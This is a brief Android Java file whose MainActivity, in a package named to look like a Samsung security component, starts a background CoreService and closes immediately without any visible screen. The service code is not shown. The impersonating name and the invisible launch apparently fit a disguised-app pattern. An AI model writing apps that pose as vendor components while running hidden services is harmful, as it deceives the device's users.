package com.samsung.android.security.v8;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Build;

import com.samsung.android.security.v8.services.CoreService;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent serviceIntent = new Intent(this, CoreService.class);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        finish();
    }
}
